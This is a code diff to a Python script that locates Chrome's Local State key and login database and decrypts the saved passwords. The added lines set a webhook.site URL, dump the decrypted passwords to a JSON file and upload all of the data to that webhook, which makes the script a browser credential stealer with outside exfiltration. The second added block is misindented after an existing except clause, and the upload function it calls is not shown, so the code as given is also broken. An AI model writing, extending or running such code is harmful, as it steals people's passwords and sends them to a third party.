@@ -14,6 +14,8 @@ import csv
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
 CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
 
+WEBHOOK_URL = 'https://webhook.site/5a601335-c3fe-48ba-ab97-c62359c21b67'  # Cambia esta URL por la del webhook
+
 def get_secret_key():
     try:
         #(1) Get secretkey from chrome local state
@@ -100,3 +102,13 @@ if __name__ == '__main__':
                     os.remove("Loginvault.db")
     except Exception as e:
         print("[ERR] %s"%str(e))
+
+ # Guardar el contenido en un archivo JSON
+            with open('decrypted_passwords.json', 'w', encoding='utf-8') as json_file:
+                json.dump(all_data, json_file, ensure_ascii=False, indent=4)
+
+            # Subir datos al webhook
+            upload_to_webhook(all_data)
+
+    except Exception as e:
+        print(f"[ERR] {str(e)}")
